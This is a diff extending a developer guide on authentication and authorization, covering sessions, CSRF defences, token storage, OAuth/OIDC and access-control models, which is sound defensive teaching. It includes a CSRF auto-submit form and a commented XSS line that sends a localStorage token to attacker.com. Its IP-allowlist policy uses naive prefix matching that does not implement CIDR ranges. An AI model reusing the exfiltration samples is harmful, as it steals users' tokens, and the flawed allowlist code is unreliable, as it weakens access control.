@@ -10,9 +10,11 @@ Authentication is the process of verifying the identity of a user, system, or en
 - [Session Management](#session-management)
 - [Multi-Factor Authentication](#multi-factor-authentication)
 - [Token-Based Authentication](#token-based-authentication)
+- [OAuth 2.0 and OpenID Connect](#oauth-20-and-openid-connect)
 - [Single Sign-On (SSO)](#single-sign-on-sso)
 - [Biometric Authentication](#biometric-authentication)
 - [Authentication Patterns](#authentication-patterns)
+- [Authorization](#authorization)
 - [Security Best Practices](#security-best-practices)
 - [Common Vulnerabilities](#common-vulnerabilities)
 
@@ -412,6 +414,64 @@ app.post('/logout', (req, res) => {
 });
 ```
 
+### Session Storage Options
+
+**Server-Side Storage (Recommended)**
+```javascript
+// Redis (recommended for distributed systems)
+const RedisStore = require('connect-redis')(session);
+app.use(session({
+  store: new RedisStore({ client: redisClient }),
+  // ... config
+}));
+
+// MongoDB
+const MongoStore = require('connect-mongo');
+app.use(session({
+  store: MongoStore.create({ mongoUrl: 'mongodb://localhost/sessions' }),
+  // ... config
+}));
+
+// PostgreSQL
+const PostgresStore = require('connect-pg-simple')(session);
+app.use(session({
+  store: new PostgresStore({ pool: pgPool }),
+  // ... config
+}));
+
+// Memory Store (development only - NOT for production)
+// Default if no store specified - loses sessions on restart
+```
+
+**Client-Side Storage (Use with Caution)**
+```javascript
+// JWT in cookies - stateless sessions
+app.use(cookieParser());
+
+function createSessionToken(user) {
+  return jwt.sign(
+    { userId: user.id, roles: user.roles },
+    process.env.SESSION_SECRET,
+    { expiresIn: '1h' }
+  );
+}
+
+app.post('/login', async (req, res) => {
+  // ... authenticate user ...
+
+  const token = createSessionToken(user);
+
+  res.cookie('session', token, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 3600000
+  });
+
+  res.json({ success: true });
+});
+```
+
 ### Session Security
 
 ```javascript
@@ -456,6 +516,107 @@ class SessionManager {
     }
   }
 }
+```
+
+### CSRF Protection
+
+**Understanding CSRF**
+
+Cross-Site Request Forgery attacks trick authenticated users into performing unwanted actions.
+
+```
+Attacker's site:
+<form action="https://bank.com/transfer" method="POST">
+  <input name="to" value="attacker" />
+  <input name="amount" value="1000" />
+</form>
+<script>document.forms[0].submit();</script>
+
+If user is logged into bank.com, this auto-submits and transfers money!
+```
+
+**CSRF Token Implementation**
+
+```javascript
+const csrf = require('csurf');
+const csrfProtection = csrf({ cookie: true });
+
+app.use(cookieParser());
+
+// Generate CSRF token
+app.get('/form', csrfProtection, (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+// Validate CSRF token
+app.post('/process', csrfProtection, (req, res) => {
+  // Token automatically validated
+  res.json({ success: true });
+});
+```
+
+**HTML Form with CSRF Token**
+```html
+<form action="/process" method="POST">
+  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
+  <input type="text" name="data" />
+  <button type="submit">Submit</button>
+</form>
+```
+
+**AJAX with CSRF Token**
+```javascript
+// Include token in request header
+fetch('/api/data', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'CSRF-Token': csrfToken
+  },
+  body: JSON.stringify({ data: 'value' })
+});
+```
+
+**SameSite Cookie Attribute**
+```javascript
+// Modern CSRF protection - prevents cookie sending on cross-site requests
+app.use(session({
+  cookie: {
+    sameSite: 'strict',  // or 'lax' for more flexibility
+    secure: true,
+    httpOnly: true
+  }
+}));
+```
+
+**Double Submit Cookie Pattern**
+```javascript
+function generateCSRFToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+app.use((req, res, next) => {
+  if (!req.cookies.csrfToken) {
+    const token = generateCSRFToken();
+    res.cookie('csrfToken', token, {
+      httpOnly: false,  // Must be readable by JavaScript
+      secure: true,
+      sameSite: 'strict'
+    });
+  }
+  next();
+});
+
+app.post('/api/*', (req, res, next) => {
+  const cookieToken = req.cookies.csrfToken;
+  const headerToken = req.headers['x-csrf-token'];
+
+  if (!cookieToken || cookieToken !== headerToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+
+  next();
+});
 ```
 
 ---
@@ -825,6 +986,253 @@ app.post('/auth/refresh', async (req, res) => {
 });
 ```
 
+### Token Storage Strategies
+
+**Comparison of Storage Options:**
+
+| Storage | Security | XSS Risk | CSRF Risk | Accessibility | Best For |
+|---------|----------|----------|-----------|---------------|----------|
+| **httpOnly Cookie** | ⭐⭐⭐⭐⭐ | Protected | Vulnerable* | Server only | Web apps |
+| **Regular Cookie** | ⭐⭐ | Vulnerable | Vulnerable* | Client & Server | Legacy |
+| **localStorage** | ⭐⭐ | Vulnerable | Protected | Client only | Never recommended |
+| **sessionStorage** | ⭐⭐ | Vulnerable | Protected | Client only | Never recommended |
+| **Memory (React state)** | ⭐⭐⭐⭐ | Vulnerable | Protected | Client only | SPAs |
+
+*CSRF risk mitigated with SameSite attribute or CSRF tokens
+
+**1. httpOnly Cookies (Recommended for Web Apps)**
+
+```javascript
+// Server-side: Set token in httpOnly cookie
+app.post('/auth/login', async (req, res) => {
+  const user = await authenticateUser(req.body);
+  const accessToken = generateAccessToken(user);
+  const refreshToken = generateRefreshToken(user);
+
+  // Access token in httpOnly cookie
+  res.cookie('accessToken', accessToken, {
+    httpOnly: true,    // Cannot be accessed by JavaScript
+    secure: true,      // HTTPS only
+    sameSite: 'strict', // CSRF protection
+    maxAge: 15 * 60 * 1000 // 15 minutes
+  });
+
+  // Refresh token in separate httpOnly cookie
+  res.cookie('refreshToken', refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    path: '/auth/refresh', // Only sent to refresh endpoint
+    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
+  });
+
+  res.json({ success: true });
+});
+
+// Client-side: Cookies sent automatically
+fetch('/api/data', {
+  method: 'GET',
+  credentials: 'include' // Important: include cookies
+});
+```
+
+**2. localStorage (NOT Recommended)**
+
+```javascript
+// ❌ Vulnerable to XSS attacks
+localStorage.setItem('token', accessToken);
+
+// Any script can read it
+const token = localStorage.getItem('token');
+
+// XSS attack example:
+// <script>
+//   const token = localStorage.getItem('token');
+//   fetch('https://attacker.com/steal?token=' + token);
+// </script>
+```
+
+**3. Memory Storage (Good for SPAs)**
+
+```javascript
+// React example - store in state/context
+const AuthContext = React.createContext();
+
+function AuthProvider({ children }) {
+  const [token, setToken] = useState(null);
+
+  const login = async (credentials) => {
+    const response = await fetch('/auth/login', {
+      method: 'POST',
+      body: JSON.stringify(credentials)
+    });
+
+    const { accessToken } = await response.json();
+    setToken(accessToken);
+  };
+
+  const logout = () => {
+    setToken(null);
+  };
+
+  return (
+    <AuthContext.Provider value={{ token, login, logout }}>
+      {children}
+    </AuthContext.Provider>
+  );
+}
+
+// API calls with token
+const useAPI = () => {
+  const { token } = useContext(AuthContext);
+
+  const fetchData = async () => {
+    const response = await fetch('/api/data', {
+      headers: {
+        'Authorization': `Bearer ${token}`
+      }
+    });
+    return await response.json();
+  };
+
+  return { fetchData };
+};
+
+// Limitation: Token lost on page refresh
+// Solution: Use refresh token in httpOnly cookie
+```
+
+**4. Hybrid Approach (Best for SPAs)**
+
+```javascript
+// Combine memory storage + httpOnly refresh token
+class TokenManager {
+  constructor() {
+    this.accessToken = null;
+  }
+
+  // Store access token in memory
+  setAccessToken(token) {
+    this.accessToken = token;
+  }
+
+  getAccessToken() {
+    return this.accessToken;
+  }
+
+  // Refresh token stored in httpOnly cookie on server
+  async refreshAccessToken() {
+    const response = await fetch('/auth/refresh', {
+      method: 'POST',
+      credentials: 'include' // Send httpOnly cookie
+    });
+
+    const { accessToken } = await response.json();
+    this.setAccessToken(accessToken);
+    return accessToken;
+  }
+
+  // Auto-refresh before expiration
+  scheduleRefresh(expiresIn) {
+    const refreshTime = (expiresIn - 60) * 1000; // Refresh 1 min before expiry
+    setTimeout(() => {
+      this.refreshAccessToken();
+    }, refreshTime);
+  }
+}
+
+// Usage
+const tokenManager = new TokenManager();
+
+// Login
+const { accessToken, expiresIn } = await login(credentials);
+tokenManager.setAccessToken(accessToken);
+tokenManager.scheduleRefresh(expiresIn);
+
+// API calls
+fetch('/api/data', {
+  headers: {
+    'Authorization': `Bearer ${tokenManager.getAccessToken()}`
+  }
+});
+```
+
+**5. Token Rotation**
+
+```javascript
+// Server-side token rotation
+class TokenRotationService {
+  static async rotateRefreshToken(oldRefreshToken) {
+    // Verify old token
+    const payload = jwt.verify(oldRefreshToken, process.env.JWT_REFRESH_SECRET);
+
+    // Check if token is revoked or reused
+    const tokenInfo = await db.refreshTokens.findOne({
+      token: hashToken(oldRefreshToken)
+    });
+
+    if (!tokenInfo) {
+      // Token reuse detected - possible attack
+      await this.revokeAllUserTokens(payload.userId);
+      throw new Error('Token reuse detected');
+    }
+
+    // Mark old token as used
+    await db.refreshTokens.update(
+      { token: hashToken(oldRefreshToken) },
+      { used: true, usedAt: new Date() }
+    );
+
+    // Generate new tokens
+    const user = await db.users.findById(payload.userId);
+    const newAccessToken = generateAccessToken(user);
+    const newRefreshToken = generateRefreshToken(user);
+
+    // Store new refresh token
+    await db.refreshTokens.create({
+      userId: user.id,
+      token: hashToken(newRefreshToken),
+      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
+    });
+
+    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
+  }
+
+  static async revokeAllUserTokens(userId) {
+    await db.refreshTokens.deleteMany({ userId });
+  }
+}
+```
+
+**Security Recommendations:**
+
+```javascript
+// ✅ Best Practices
+const TOKEN_STORAGE_BEST_PRACTICES = {
+  webApps: 'httpOnly cookies with SameSite=strict',
+  spas: 'Memory (state) + httpOnly refresh token',
+  mobileApps: 'Secure storage (Keychain/Keystore)',
+
+  avoid: [
+    'localStorage for tokens',
+    'sessionStorage for tokens',
+    'Regular cookies for tokens',
+    'URL parameters for tokens'
+  ],
+
+  additional: [
+    'Use short-lived access tokens (15 min)',
+    'Implement token rotation',
+    'Monitor for token reuse',
+    'Revoke tokens on logout',
+    'Use HTTPS always',
+    'Implement CSRF protection for cookies'
+  ]
+};
+```
+
+---
+
 ### API Key Authentication
 
 ```javascript
@@ -900,6 +1308,202 @@ async function authenticateAPIKey(req, res, next) {
   } catch (error) {
     return res.status(401).json({ error: 'Invalid API key' });
   }
+}
+```
+
+---
+
+## OAuth 2.0 and OpenID Connect
+
+### OAuth 2.0 Overview
+
+OAuth 2.0 is an **authorization** framework that enables applications to obtain limited access to user accounts. It delegates user authentication to the service hosting the account and authorizes third-party applications.
+
+**Key OAuth 2.0 Flows:**
+
+```javascript
+// 1. Authorization Code Flow (most secure, for server-side apps)
+const authUrl = `${AUTHORIZATION_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=read write&state=${STATE}`;
+
+// 2. Client Credentials Flow (for machine-to-machine)
+const tokenResponse = await fetch(TOKEN_URL, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: new URLSearchParams({
+    grant_type: 'client_credentials',
+    client_id: CLIENT_ID,
+    client_secret: CLIENT_SECRET
+  })
+});
+
+// 3. PKCE (Proof Key for Code Exchange) - for mobile/SPA
+const codeVerifier = generateCodeVerifier();
+const codeChallenge = generateCodeChallenge(codeVerifier);
+
+const authUrl = `${AUTHORIZATION_URL}?response_type=code&client_id=${CLIENT_ID}&code_challenge=${codeChallenge}&code_challenge_method=S256`;
+```
+
+**Grant Types Comparison:**
+
+| Grant Type | Use Case | Client Type | Security |
+|------------|----------|-------------|----------|
+| **Authorization Code** | Web apps | Confidential | ⭐⭐⭐⭐⭐ |
+| **Authorization Code + PKCE** | Mobile, SPA | Public | ⭐⭐⭐⭐⭐ |
+| **Client Credentials** | Service-to-service | Confidential | ⭐⭐⭐⭐ |
+| **Implicit** (deprecated) | SPA | Public | ⭐⭐ |
+| **Password** (deprecated) | Legacy | Any | ⭐ |
+
+**Token Types:**
+
+```javascript
+// Access Token - short-lived, used to access resources
+{
+  "access_token": "eyJhbGciOiJIUzI1NiIs...",
+  "token_type": "Bearer",
+  "expires_in": 3600  // 1 hour
+}
+
+// Refresh Token - long-lived, used to obtain new access tokens
+{
+  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
+  "expires_in": 604800  // 7 days
+}
+```
+
+**For detailed OAuth 2.0 implementation examples, see [oauth2.md](oauth2.md)**
+
+### OpenID Connect (OIDC)
+
+OpenID Connect is an **authentication** layer built on top of OAuth 2.0. It adds identity verification capabilities to OAuth.
+
+**Key Differences from OAuth 2.0:**
+
+```
+OAuth 2.0:  Authorization - "What can you access?"
+OIDC:       Authentication + Authorization - "Who are you?" + "What can you access?"
+```
+
+**OIDC Tokens:**
+
+```javascript
+// ID Token - contains user identity information
+{
+  "iss": "https://accounts.example.com",
+  "sub": "248289761001",
+  "aud": "your-client-id",
+  "exp": 1516239022,
+  "iat": 1516239022,
+  "name": "Alice Smith",
+  "email": "alice@example.com",
+  "email_verified": true
+}
+
+// Access Token - same as OAuth 2.0
+
+// Refresh Token - same as OAuth 2.0
+```
+
+**OIDC Implementation:**
+
+```javascript
+const { Issuer, generators } = require('openid-client');
+
+class OIDCAuth {
+  static async initialize() {
+    // Discover OIDC configuration
+    const issuer = await Issuer.discover('https://accounts.google.com');
+
+    this.client = new issuer.Client({
+      client_id: process.env.OIDC_CLIENT_ID,
+      client_secret: process.env.OIDC_CLIENT_SECRET,
+      redirect_uris: ['https://myapp.com/callback'],
+      response_types: ['code']
+    });
+  }
+
+  // Initiate login
+  static getAuthUrl() {
+    const codeVerifier = generators.codeVerifier();
+    const codeChallenge = generators.codeChallenge(codeVerifier);
+    const state = generators.state();
+
+    const authUrl = this.client.authorizationUrl({
+      scope: 'openid email profile',
+      code_challenge: codeChallenge,
+      code_challenge_method: 'S256',
+      state
+    });
+
+    return { authUrl, codeVerifier, state };
+  }
+
+  // Handle callback
+  static async handleCallback(callbackParams, codeVerifier, state) {
+    // Exchange code for tokens
+    const tokenSet = await this.client.callback(
+      'https://myapp.com/callback',
+      callbackParams,
+      { code_verifier: codeVerifier, state }
+    );
+
+    // Verify ID token
+    const claims = tokenSet.claims();
+
+    // Get additional user info
+    const userInfo = await this.client.userinfo(tokenSet.access_token);
+
+    return {
+      userId: claims.sub,
+      email: claims.email,
+      name: claims.name,
+      tokens: tokenSet
+    };
+  }
+
+  // Verify ID token
+  static async verifyIdToken(idToken) {
+    const tokenSet = await this.client.validateIdToken(idToken);
+    return tokenSet.claims();
+  }
+}
+```
+
+**OIDC Scopes:**
+
+```javascript
+// Standard OIDC scopes
+const scopes = {
+  openid: 'Required - indicates OIDC request',
+  profile: 'Access to profile info (name, picture, etc.)',
+  email: 'Access to email and email_verified',
+  address: 'Access to address info',
+  phone: 'Access to phone number'
+};
+
+// Usage
+const authUrl = client.authorizationUrl({
+  scope: 'openid email profile'
+});
+```
+
+**UserInfo Endpoint:**
+
+```javascript
+// Fetch additional user information
+async function getUserInfo(accessToken) {
+  const response = await fetch('https://accounts.example.com/userinfo', {
+    headers: {
+      'Authorization': `Bearer ${accessToken}`
+    }
+  });
+
+  return await response.json();
+  // {
+  //   "sub": "248289761001",
+  //   "name": "Alice Smith",
+  //   "email": "alice@example.com",
+  //   "picture": "https://example.com/photo.jpg"
+  // }
 }
 ```
 
@@ -1331,6 +1935,689 @@ app.get('/auth/verify', async (req, res) => {
     res.status(400).send('Invalid or expired link');
   }
 });
+```
+
+---
+
+## Authorization
+
+Authorization determines what an authenticated user is allowed to do. After verifying identity (authentication), the system must decide what resources and actions the user can access.
+
+### Authorization Models Overview
+
+| Model | Description | Best For | Complexity |
+|-------|-------------|----------|------------|
+| **RBAC** | Role-Based Access Control | Most applications | ⭐⭐ |
+| **ABAC** | Attribute-Based Access Control | Complex policies | ⭐⭐⭐⭐ |
+| **ACL** | Access Control Lists | Simple resources | ⭐ |
+| **ReBAC** | Relationship-Based Access Control | Social apps | ⭐⭐⭐ |
+| **PBAC** | Policy-Based Access Control | Enterprise | ⭐⭐⭐⭐⭐ |
+
+### Role-Based Access Control (RBAC)
+
+Users are assigned roles, and roles have permissions.
+
+**Basic RBAC Implementation:**
+
+```javascript
+// Define roles and permissions
+const roles = {
+  admin: ['read', 'write', 'delete', 'manage_users'],
+  editor: ['read', 'write'],
+  viewer: ['read']
+};
+
+// User model
+const user = {
+  id: 1,
+  username: 'alice',
+  roles: ['editor']
+};
+
+// Check permission
+function hasPermission(user, permission) {
+  return user.roles.some(role =>
+    roles[role]?.includes(permission)
+  );
+}
+
+// Usage
+if (hasPermission(user, 'write')) {
+  // Allow write operation
+}
+```
+
+**Database Schema for RBAC:**
+
+```sql
+-- Users table
+CREATE TABLE users (
+  id SERIAL PRIMARY KEY,
+  username VARCHAR(255) UNIQUE NOT NULL,
+  email VARCHAR(255) UNIQUE NOT NULL
+);
+
+-- Roles table
+CREATE TABLE roles (
+  id SERIAL PRIMARY KEY,
+  name VARCHAR(50) UNIQUE NOT NULL,
+  description TEXT
+);
+
+-- Permissions table
+CREATE TABLE permissions (
+  id SERIAL PRIMARY KEY,
+  name VARCHAR(100) UNIQUE NOT NULL,
+  resource VARCHAR(100) NOT NULL,
+  action VARCHAR(50) NOT NULL
+);
+
+-- User-Role assignment (many-to-many)
+CREATE TABLE user_roles (
+  user_id INT REFERENCES users(id) ON DELETE CASCADE,
+  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
+  PRIMARY KEY (user_id, role_id)
+);
+
+-- Role-Permission assignment (many-to-many)
+CREATE TABLE role_permissions (
+  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
+  permission_id INT REFERENCES permissions(id) ON DELETE CASCADE,
+  PRIMARY KEY (role_id, permission_id)
+);
+```
+
+**Advanced RBAC with Hierarchical Roles:**
+
+```javascript
+class RBACService {
+  constructor() {
+    // Role hierarchy
+    this.roleHierarchy = {
+      admin: ['editor', 'viewer'],
+      editor: ['viewer'],
+      viewer: []
+    };
+
+    // Permissions per role
+    this.rolePermissions = {
+      admin: ['users:*', 'posts:*', 'settings:*'],
+      editor: ['posts:read', 'posts:write', 'posts:delete'],
+      viewer: ['posts:read']
+    };
+  }
+
+  // Get all inherited roles
+  getInheritedRoles(role) {
+    const inherited = [role];
+    const children = this.roleHierarchy[role] || [];
+
+    for (const childRole of children) {
+      inherited.push(...this.getInheritedRoles(childRole));
+    }
+
+    return [...new Set(inherited)];
+  }
+
+  // Get all permissions for user
+  getUserPermissions(user) {
+    const allRoles = user.roles.flatMap(role =>
+      this.getInheritedRoles(role)
+    );
+
+    const permissions = allRoles.flatMap(role =>
+      this.rolePermissions[role] || []
+    );
+
+    return [...new Set(permissions)];
+  }
+
+  // Check if user has permission
+  hasPermission(user, requiredPermission) {
+    const userPermissions = this.getUserPermissions(user);
+
+    return userPermissions.some(permission => {
+      // Exact match
+      if (permission === requiredPermission) return true;
+
+      // Wildcard match (e.g., "posts:*" matches "posts:read")
+      if (permission.endsWith(':*')) {
+        const prefix = permission.slice(0, -2);
+        return requiredPermission.startsWith(prefix);
+      }
+
+      return false;
+    });
+  }
+}
+
+// Usage
+const rbac = new RBACService();
+const user = { roles: ['editor'] };
+
+console.log(rbac.hasPermission(user, 'posts:write')); // true
+console.log(rbac.hasPermission(user, 'users:delete')); // false
+```
+
+**Express Middleware for RBAC:**
+
+```javascript
+function requireRole(...allowedRoles) {
+  return (req, res, next) => {
+    if (!req.user) {
+      return res.status(401).json({ error: 'Not authenticated' });
+    }
+
+    const hasRole = req.user.roles.some(role =>
+      allowedRoles.includes(role)
+    );
+
+    if (!hasRole) {
+      return res.status(403).json({ error: 'Insufficient permissions' });
+    }
+
+    next();
+  };
+}
+
+function requirePermission(...requiredPermissions) {
+  return (req, res, next) => {
+    if (!req.user) {
+      return res.status(401).json({ error: 'Not authenticated' });
+    }
+
+    const rbac = new RBACService();
+    const hasPermission = requiredPermissions.every(permission =>
+      rbac.hasPermission(req.user, permission)
+    );
+
+    if (!hasPermission) {
+      return res.status(403).json({ error: 'Insufficient permissions' });
+    }
+
+    next();
+  };
+}
+
+// Routes
+app.get('/admin/users', requireRole('admin'), (req, res) => {
+  res.json({ users: [] });
+});
+
+app.delete('/posts/:id', requirePermission('posts:delete'), (req, res) => {
+  res.json({ success: true });
+});
+```
+
+### Attribute-Based Access Control (ABAC)
+
+Permissions based on attributes of the user, resource, action, and environment.
+
+```javascript
+class ABACService {
+  // Define policies
+  static policies = [
+    {
+      name: 'Allow owner to edit their posts',
+      effect: 'allow',
+      condition: (context) => {
+        return context.user.id === context.resource.ownerId &&
+               context.action === 'edit';
+      }
+    },
+    {
+      name: 'Allow managers to edit posts in their department',
+      effect: 'allow',
+      condition: (context) => {
+        return context.user.role === 'manager' &&
+               context.user.department === context.resource.department &&
+               context.action === 'edit';
+      }
+    },
+    {
+      name: 'Block editing during maintenance',
+      effect: 'deny',
+      condition: (context) => {
+        return context.environment.maintenanceMode &&
+               ['edit', 'delete'].includes(context.action);
+      }
+    },
+    {
+      name: 'Allow reading published posts',
+      effect: 'allow',
+      condition: (context) => {
+        return context.resource.status === 'published' &&
+               context.action === 'read';
+      }
+    }
+  ];
+
+  // Evaluate access
+  static evaluateAccess(context) {
+    let decision = 'deny'; // Default deny
+
+    for (const policy of this.policies) {
+      if (policy.condition(context)) {
+        if (policy.effect === 'deny') {
+          return 'deny'; // Explicit deny overrides allows
+        }
+        decision = 'allow';
+      }
+    }
+
+    return decision;
+  }
+
+  // Check if user can perform action
+  static canAccess(user, resource, action, environment = {}) {
+    const context = { user, resource, action, environment };
+    return this.evaluateAccess(context) === 'allow';
+  }
+}
+
+// Usage
+const user = {
+  id: 123,
+  role: 'manager',
+  department: 'engineering'
+};
+
+const post = {
+  id: 456,
+  ownerId: 789,
+  department: 'engineering',
+  status: 'published'
+};
+
+const canEdit = ABACService.canAccess(user, post, 'edit');
+console.log(canEdit); // true (manager in same department)
+
+// With environment context
+const canEditDuringMaintenance = ABACService.canAccess(
+  user,
+  post,
+  'edit',
+  { maintenanceMode: true }
+);
+console.log(canEditDuringMaintenance); // false (maintenance block)
+```
+
+**Complex ABAC Policy Engine:**
+
+```javascript
+class PolicyEngine {
+  constructor() {
+    this.policies = [];
+  }
+
+  addPolicy(policy) {
+    this.policies.push(policy);
+  }
+
+  evaluate(request) {
+    const { subject, resource, action, context } = request;
+
+    // Check all policies
+    const results = this.policies.map(policy => ({
+      policy: policy.name,
+      effect: policy.evaluate(subject, resource, action, context)
+    }));
+
+    // Deny if any policy explicitly denies
+    if (results.some(r => r.effect === 'deny')) {
+      return { decision: 'deny', reason: 'Explicit deny' };
+    }
+
+    // Allow if at least one policy allows
+    if (results.some(r => r.effect === 'allow')) {
+      return { decision: 'allow' };
+    }
+
+    // Default deny
+    return { decision: 'deny', reason: 'No matching allow policy' };
+  }
+}
+
+// Define complex policies
+const ownerPolicy = {
+  name: 'resource-owner',
+  evaluate: (subject, resource, action) => {
+    if (subject.id === resource.ownerId) {
+      return 'allow';
+    }
+    return 'neutral';
+  }
+};
+
+const timePolicy = {
+  name: 'business-hours',
+  evaluate: (subject, resource, action, context) => {
+    const hour = new Date().getHours();
+    if (hour < 9 || hour > 17) {
+      return 'deny';
+    }
+    return 'neutral';
+  }
+};
+
+const ipPolicy = {
+  name: 'ip-whitelist',
+  evaluate: (subject, resource, action, context) => {
+    const allowedIPs = ['192.168.1.0/24', '10.0.0.0/8'];
+    if (allowedIPs.some(ip => context.ipAddress.startsWith(ip.split('/')[0]))) {
+      return 'allow';
+    }
+    return 'neutral';
+  }
+};
+
+// Use policy engine
+const engine = new PolicyEngine();
+engine.addPolicy(ownerPolicy);
+engine.addPolicy(timePolicy);
+engine.addPolicy(ipPolicy);
+
+const decision = engine.evaluate({
+  subject: { id: 123, role: 'user' },
+  resource: { id: 456, ownerId: 123 },
+  action: 'edit',
+  context: { ipAddress: '192.168.1.100' }
+});
+```
+
+### Access Control Lists (ACL)
+
+Direct mapping of users/groups to resource permissions.
+
+```javascript
+class ACLService {
+  constructor() {
+    // ACL storage: resource -> user -> permissions
+    this.acls = new Map();
+  }
+
+  // Grant permission
+  grant(resourceId, userId, permission) {
+    if (!this.acls.has(resourceId)) {
+      this.acls.set(resourceId, new Map());
+    }
+
+    const resourceACL = this.acls.get(resourceId);
+    if (!resourceACL.has(userId)) {
+      resourceACL.set(userId, new Set());
+    }
+
+    resourceACL.get(userId).add(permission);
+  }
+
+  // Revoke permission
+  revoke(resourceId, userId, permission) {
+    const resourceACL = this.acls.get(resourceId);
+    if (resourceACL?.has(userId)) {
+      resourceACL.get(userId).delete(permission);
+    }
+  }
+
+  // Check permission
+  isAllowed(resourceId, userId, permission) {
+    const resourceACL = this.acls.get(resourceId);
+    if (!resourceACL) return false;
+
+    const userPermissions = resourceACL.get(userId);
+    if (!userPermissions) return false;
+
+    return userPermissions.has(permission) ||
+           userPermissions.has('*'); // Wildcard
+  }
+
+  // Get all permissions for user on resource
+  getPermissions(resourceId, userId) {
+    const resourceACL = this.acls.get(resourceId);
+    return Array.from(resourceACL?.get(userId) || []);
+  }
+
+  // Get all users with access to resource
+  getUsers(resourceId) {
+    const resourceACL = this.acls.get(resourceId);
+    if (!resourceACL) return [];
+
+    return Array.from(resourceACL.keys());
+  }
+}
+
+// Usage
+const acl = new ACLService();
+
+// Grant permissions
+acl.grant('document:123', 'user:alice', 'read');
+acl.grant('document:123', 'user:alice', 'write');
+acl.grant('document:123', 'user:bob', 'read');
+
+// Check permissions
+console.log(acl.isAllowed('document:123', 'user:alice', 'write')); // true
+console.log(acl.isAllowed('document:123', 'user:bob', 'write')); // false
+
+// Revoke permission
+acl.revoke('document:123', 'user:alice', 'write');
+```
+
+**Database Schema for ACL:**
+
+```sql
+CREATE TABLE acl_entries (
+  id SERIAL PRIMARY KEY,
+  resource_type VARCHAR(50) NOT NULL,
+  resource_id VARCHAR(255) NOT NULL,
+  principal_type VARCHAR(50) NOT NULL, -- 'user' or 'group'
+  principal_id VARCHAR(255) NOT NULL,
+  permission VARCHAR(100) NOT NULL,
+  granted BOOLEAN DEFAULT true,
+  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+  UNIQUE(resource_type, resource_id, principal_type, principal_id, permission)
+);
+
+CREATE INDEX idx_acl_resource ON acl_entries(resource_type, resource_id);
+CREATE INDEX idx_acl_principal ON acl_entries(principal_type, principal_id);
+```
+
+### Relationship-Based Access Control (ReBAC)
+
+Authorization based on relationships between users and resources (e.g., "owner", "collaborator", "follower").
+
+```javascript
+class ReBAC {
+  constructor() {
+    // Store relationships: subject -> relation -> object
+    this.relationships = new Map();
+  }
+
+  // Add relationship
+  addRelation(subject, relation, object) {
+    const key = `${subject}:${relation}`;
+    if (!this.relationships.has(key)) {
+      this.relationships.set(key, new Set());
+    }
+    this.relationships.get(key).add(object);
+  }
+
+  // Check relationship
+  hasRelation(subject, relation, object) {
+    const key = `${subject}:${relation}`;
+    return this.relationships.get(key)?.has(object) || false;
+  }
+
+  // Check if user can perform action
+  can(user, action, resource) {
+    // Define rules
+    const rules = {
+      'read': ['owner', 'collaborator', 'viewer'],
+      'write': ['owner', 'collaborator'],
+      'delete': ['owner'],
+      'share': ['owner']
+    };
+
+    const requiredRelations = rules[action];
+    if (!requiredRelations) return false;
+
+    return requiredRelations.some(relation =>
+      this.hasRelation(user, relation, resource)
+    );
+  }
+
+  // Get all objects user has relation with
+  getRelated(subject, relation) {
+    const key = `${subject}:${relation}`;
+    return Array.from(this.relationships.get(key) || []);
+  }
+}
+
+// Usage
+const rebac = new ReBAC();
+
+// Define relationships
+rebac.addRelation('user:alice', 'owner', 'doc:123');
+rebac.addRelation('user:bob', 'collaborator', 'doc:123');
+rebac.addRelation('user:charlie', 'viewer', 'doc:123');
+
+// Check permissions
+console.log(rebac.can('user:alice', 'delete', 'doc:123')); // true
+console.log(rebac.can('user:bob', 'write', 'doc:123')); // true
+console.log(rebac.can('user:charlie', 'write', 'doc:123')); // false
+```
+
+### OAuth 2.0 Scopes
+
+OAuth uses scopes for fine-grained authorization.
+
+```javascript
+class ScopeAuthorization {
+  // Define scope hierarchy
+  static scopeHierarchy = {
+    'admin': ['read', 'write', 'delete'],
+    'write': ['read'],
+    'read': []
+  };
+
+  // Check if token has required scope
+  static hasScope(tokenScopes, requiredScope) {
+    // Check exact match
+    if (tokenScopes.includes(requiredScope)) {
+      return true;
+    }
+
+    // Check if any token scope includes required scope
+    return tokenScopes.some(tokenScope => {
+      const inherited = this.scopeHierarchy[tokenScope] || [];
+      return inherited.includes(requiredScope);
+    });
+  }
+
+  // Middleware
+  static requireScope(...requiredScopes) {
+    return (req, res, next) => {
+      const token = req.user?.token;
+      if (!token) {
+        return res.status(401).json({ error: 'No token' });
+      }
+
+      const hasAllScopes = requiredScopes.every(scope =>
+        this.hasScope(token.scopes, scope)
+      );
+
+      if (!hasAllScopes) {
+        return res.status(403).json({
+          error: 'Insufficient scopes',
+          required: requiredScopes,
+          provided: token.scopes
+        });
+      }
+
+      next();
+    };
+  }
+}
+
+// Usage
+app.get('/api/data',
+  authenticateJWT,
+  ScopeAuthorization.requireScope('read'),
+  (req, res) => {
+    res.json({ data: [] });
+  }
+);
+
+app.post('/api/data',
+  authenticateJWT,
+  ScopeAuthorization.requireScope('write'),
+  (req, res) => {
+    res.json({ success: true });
+  }
+);
+```
+
+### Authorization Best Practices
+
+```javascript
+// 1. Principle of Least Privilege
+// Grant minimal permissions needed
+const minimalPermissions = ['posts:read'];
+const excessivePermissions = ['posts:*', 'users:*', 'settings:*']; // ❌
+
+// 2. Deny by Default
+function checkAccess(user, resource, action) {
+  // Default deny
+  let allowed = false;
+
+  // Explicit checks
+  if (user.isOwner(resource)) allowed = true;
+  if (user.hasPermission(action)) allowed = true;
+
+  return allowed;
+}
+
